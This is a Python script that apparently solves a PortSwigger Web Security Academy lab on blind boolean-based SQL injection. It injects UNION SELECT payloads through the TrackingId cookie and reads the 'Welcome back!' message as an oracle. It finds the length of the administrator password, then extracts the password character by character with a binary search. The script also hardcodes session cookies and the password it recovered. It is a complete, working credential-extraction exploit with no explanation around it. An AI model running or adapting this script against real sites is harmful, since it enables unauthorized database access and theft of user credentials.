import requests

cookies = {
	'TrackingId': 'p7QOvjqcBXwMVRHG',
	'session': 'KRHpB9WQXk4CuzR6JEddSWuzszzZb7WC',
}

headers = {
	'authority': '0ad300c504061486c0fda09600100016.web-security-academy.net',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	'accept-language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
# 'cookie': 'TrackingId=p7QOvjqcBXwMVRHG; session=KRHpB9WQXk4CuzR6JEddSWuzszzZb7WC',
	'referer': 'https://0ad300c504061486c0fda09600100016.web-security-academy.net/filter?category=Gifts',
	'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-platform': '"Windows"',
	'sec-fetch-dest': 'document',
	'sec-fetch-mode': 'navigate',
	'sec-fetch-site': 'same-origin',
	'sec-fetch-user': '?1',
	'upgrade-insecure-requests': '1',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
}

def check(s):
	cookies['TrackingId'] = s;
	response = requests.get('https://0ad300c504061486c0fda09600100016.web-security-academy.net/', cookies=cookies, headers=headers)
	return "Welcome back!" in response.text;

def make_string(pos, c):
	return "' UNION SELECT password FROM public.users WHERE username='administrator' and SUBSTR(password, " + str(pos) + ", 1) > '" + c + "' -- abc";

def find_length():
	for i in range(1, 100, 1):
		t = check("' UNION SELECT password FROM public.users WHERE username='administrator' and LENGTH(password) > " + str(i) + " -- abc")
		print(i, t)
		if(t == False):
			return i
def find_password(n):
	pwd = ""
	s = ""
	table="0123456789abcdefghijklmnopqrstuvwxyz"
	for i in range(1, n+1):
		l = -1
		r = len(table)
		while (r - l) > 1:
			mid = (l + r)//2
			s = make_string(i, table[mid])
			t = check(s)
			if t:
				l = mid
			else:
				r = mid
		pwd += table[l+1]
		print(i, pwd)
	return pwd

print(check("' UNION SELECT 'meow' -- abc"))
print(check("' UNION SELECT password FROM public.users WHERE username='administrator' -- abc"))
print(check("' UNION SELECT password FROM public.users WHERE username='administrator' and SUBSTR(password, 1, 1) > 'm' -- abc"))

# n = find_length()
n = 20
# pwd = find_password(n)
pwd = '7jolikmnp7lt6ybz1q5c'
print("pwd = ", pwd, len(pwd))
print(check("' UNION SELECT password FROM public.users WHERE username='administrator' and password = '"+pwd+"' -- abc"))
